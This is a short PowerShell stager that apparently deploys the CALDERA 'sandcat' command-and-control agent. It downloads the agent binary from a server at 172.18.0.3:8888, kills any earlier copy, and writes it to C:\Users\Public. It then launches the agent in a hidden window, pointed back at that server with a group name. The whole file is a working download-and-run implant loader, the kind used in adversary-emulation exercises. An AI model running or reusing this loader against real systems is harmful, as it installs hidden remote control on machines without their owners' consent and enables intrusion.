cd "C:\Program Files\SysinternalsSuite\"

$groupname=$args[0]

$server="http://172.18.0.3:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
rm -force "C:\Users\Public\$name.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group $groupname" -WindowStyle hidden;

